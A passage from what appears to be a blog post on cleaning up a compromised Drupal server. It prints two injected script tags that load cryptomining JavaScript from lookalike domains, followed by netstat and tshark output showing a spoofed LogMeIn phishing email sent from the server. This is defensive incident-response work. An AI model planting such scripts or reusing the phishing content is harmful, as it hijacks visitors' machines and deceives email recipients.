+&lt;/div>&lt;p>There were two folders: &lt;code>subdomain&lt;/code> and &lt;code>site&lt;/code>. Since &lt;code>subdomain&lt;/code> is the most recent updated folder, I delved onto the &lt;code>includes/&lt;/code> subfolder:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">user@host:/var/www/subdomain$ ls -la --full-time includes/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">total 1804
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 4 www-data www-data 4096 2017-05-25 21:38:11.742771907 -0400 .
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 11 www-data www-data 4096 2018-09-03 23:52:29.924296116 -0400 ..
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 13816 2017-05-25 17:54:24.388035506 -0400 actions.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 46913 2017-05-25 17:54:24.388035506 -0400 ajax.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 1701 2017-05-25 17:54:24.388035506 -0400 archiver.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 13664 2017-05-25 17:54:24.384035450 -0400 authorize.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 17497 2017-05-25 17:54:24.388035506 -0400 batch.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 2310 2017-05-25 17:54:24.380035393 -0400 batch.queue.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 19998 2017-05-25 17:54:24.384035450 -0400 cache.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 2487 2017-05-25 17:54:24.384035450 -0400 cache-install.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 www-data www-data 302278 2017-05-25 17:54:24.384035450 -0400 common.inc
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">...
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>There was one particulr line that looks very suspicious (because of the last updated timetstamp and the size was larger than the others):&lt;/p>
+&lt;p>&lt;code>-rw-r--r-- 1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc&lt;/code>&lt;/p>
+&lt;p>While sifting through the file I was able to find something interesting at the end:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">?&amp;gt;&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;text/javascript&amp;#34;&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;//upgraderservices.cf/drupal.js&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="cp">&amp;lt;?php^M
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;text/javascript&amp;#34;&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;//drupalupdates.tk/check.js&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="err">&amp;lt;&lt;/span>?php^M
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This looked very suspicious because of the domains and so I researched this piece of code and found out these were cryptomining scripts, as reported by a twitter post: &lt;a class="link" href="https://twitter.com/bad_packets/status/1037416308336287744" target="_blank" rel="noopener"
+>https://twitter.com/bad_packets/status/1037416308336287744&lt;/a>&lt;/p>
+&lt;p>To remediate this issue, I simply removed these scripts. However, the connections still persisted:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">user@host:/var/www/subdomain$ netstat -an
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">Active Internet connections (servers and established)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">Proto Recv-Q Send-Q Local Address Foreign Address State
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:42191 98.137.157.43:25 TIME_WAIT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:47567 192.64.147.176:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:48204 23.20.239.12:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:46017 67.195.228.87:25 TIME_WAIT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:48211 23.20.239.12:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:50025 98.136.101.116:25 TIME_WAIT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:49812 52.162.126.195:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:36409 185.53.178.8:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:48231 23.20.239.12:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:43103 207.148.248.145:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:58587 162.255.119.180:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 168 10.10.10.10:22 10.10.10.12:38580 ESTABLISHED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:42186 98.137.157.43:25 TIME_WAIT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:45291 68.178.213.61:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:37805 204.188.217.xx:80 ESTABLISHED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 2205 10.10.10.10:34654 216.120.254.206:25 ESTABLISHED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:39909 184.168.131.241:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:48962 184.168.47.225:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:38409 98.136.96.73:25 TIME_WAIT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:55883 216.251.100.19:25 ESTABLISHED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:32777 204.188.217.xx:80 ESTABLISHED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:33846 159.8.40.50:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:47992 198.185.159.145:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 1 10.10.10.10:39920 184.168.131.241:25 SYN_SENT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:37092 66.218.85.151:25 TIME_WAIT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp6 0 0 :::80 :::* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp6 0 0 :::22 :::* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp6 0 0 :::25 :::* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp6 0 0 :::443 :::* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 10.10.10.10:123 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 127.0.0.1:123 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">...
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now there was even a SMTP port open (port &lt;strong>25&lt;/strong>). I sniffed some packets on the SMTP port:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">user&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">subdomain&lt;/span>&lt;span class="o">$&lt;/span> &lt;span class="n">sudo&lt;/span> &lt;span class="n">tshark&lt;/span> &lt;span class="s2">&amp;#34;port 25&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Running&lt;/span> &lt;span class="n">as&lt;/span> &lt;span class="n">user&lt;/span> &lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">group&lt;/span> &lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">This&lt;/span> &lt;span class="n">could&lt;/span> &lt;span class="n">be&lt;/span> &lt;span class="n">dangerous&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">tshark&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Lua&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Error&lt;/span> &lt;span class="n">during&lt;/span> &lt;span class="n">loading&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">wireshark&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">init&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">lua&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">dofile&lt;/span> &lt;span class="n">has&lt;/span> &lt;span class="n">been&lt;/span> &lt;span class="n">disabled&lt;/span> &lt;span class="n">due&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">running&lt;/span> &lt;span class="n">Wireshark&lt;/span> &lt;span class="n">as&lt;/span> &lt;span class="n">superuser&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">See&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">wiki&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wireshark&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">org&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">CaptureSetup&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">CapturePrivileges&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">help&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">running&lt;/span> &lt;span class="n">Wireshark&lt;/span> &lt;span class="n">as&lt;/span> &lt;span class="n">an&lt;/span> &lt;span class="n">unprivileged&lt;/span> &lt;span class="n">user&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Capturing&lt;/span> &lt;span class="n">on&lt;/span> &lt;span class="s1">&amp;#39;eth0&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">155&lt;/span> &lt;span class="mf">187.354503622&lt;/span> &lt;span class="mf">74.6&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">137.68&lt;/span> &lt;span class="err">→&lt;/span> &lt;span class="mf">10.10&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">10.10&lt;/span> &lt;span class="n">SMTP&lt;/span> &lt;span class="mi">171&lt;/span> &lt;span class="n">S&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">250&lt;/span> &lt;span class="n">sender&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">website&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ca&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">ok&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">250&lt;/span> &lt;span class="n">recipient&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">atheneos&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">atheneoscafe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">ok&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">354&lt;/span> &lt;span class="n">go&lt;/span> &lt;span class="n">ahead&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">156&lt;/span> &lt;span class="mf">187.354596107&lt;/span> &lt;span class="mf">10.10&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">10.10&lt;/span> &lt;span class="err">→&lt;/span> &lt;span class="mf">74.6&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">137.68&lt;/span> &lt;span class="n">SMTP&lt;/span> &lt;span class="mi">1514&lt;/span> &lt;span class="n">C&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">DATA&lt;/span> &lt;span class="n">fragment&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1448&lt;/span> &lt;span class="n">bytes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">157&lt;/span> &lt;span class="mf">187.354605929&lt;/span> &lt;span class="mf">10.10&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">10.10&lt;/span> &lt;span class="err">→&lt;/span> &lt;span class="mf">74.6&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">137.68&lt;/span> &lt;span class="n">SMTP&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">IMF&lt;/span> &lt;span class="mi">853&lt;/span> &lt;span class="n">subject&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">UTF&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">B&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">TG9nTWVJbiBOb3RpZmljYXRpb24gLSBDb21wdXRlciBJRDogMjg1MzI4NTczNSBkZWxldGVk&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">from&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">UTF&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">B&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">TG9nTWVJbi5jb20&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">noreplay&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">logmein&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="n">Event&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Computer&lt;/span> &lt;span class="n">deleted&lt;/span>&lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="n">If&lt;/span> &lt;span class="n">this&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">an&lt;/span> &lt;span class="n">error&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">use&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">link&lt;/span> &lt;span class="n">bellow&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">restore&lt;/span> &lt;span class="n">your&lt;/span> &lt;span class="n">computer&lt;/span> &lt;span class="n">back&lt;/span>&lt;span class="o">.&amp;lt;/&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;&lt;/span>&lt;span class="n">a&lt;/span> &lt;span class="n">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;nofollow noopener&amp;#34;&lt;/span> &lt;span class="n">target&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;_blank&amp;#34;&lt;/span> &lt;span class="n">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;https://restore.logmein.click/pc/?e=bmV0LmFzc2FzeW5AeWFob28uY29t&amp;#34;&lt;/span> &lt;span class="n">style&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;outline: none; color: #00aeef; font-weight:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bold&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">decoration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">none&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;http://restore.logmein.com/login.aspx?clusterid=YXRoZW5lb3NAYXRoZW5lb3NjYWZlLmNvbQ==&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;br /&amp;gt; Account holder: atheneos@atheneoscafe.com&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">br&lt;/span> &lt;span class="o">/&amp;gt;&lt;/span> &lt;span class="n">Computer&lt;/span> &lt;span class="n">ID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5714726389&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">br&lt;/span> &lt;span class="o">/&amp;gt;&lt;/span> &lt;span class="n">At&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">21.12&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">2018&lt;/span> &lt;span class="mi">13&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">03&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">br&lt;/span> &lt;span class="o">/&amp;gt;&lt;/span> &lt;span class="n">From&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">127.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">0.1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">br&lt;/span> &lt;span class="o">/&amp;gt;&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">br&lt;/span> &lt;span class="o">/&amp;gt;&lt;/span> &lt;span class="n">LogMeIn&lt;/span> &lt;span class="n">Account&lt;/span> &lt;span class="n">Holders&lt;/span> &lt;span class="n">can&lt;/span> &lt;span class="n">change&lt;/span> &lt;span class="n">notification&lt;/span> &lt;span class="n">settings&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">by&lt;/span> &lt;span class="n">clicking&lt;/span> &lt;span class="n">their&lt;/span> &lt;span class="n">LogMeIn&lt;/span> &lt;span class="n">ID&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">upper&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">right&lt;/span> &lt;span class="n">corner&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">LogMeIn&lt;/span> &lt;span class="n">Central&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">then&lt;/span> &lt;span class="n">Account&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">Security&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">Account&lt;/span> &lt;span class="n">Audit&lt;/span>&lt;span class="o">.&amp;lt;/&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="p">,&lt;/span> &lt;span 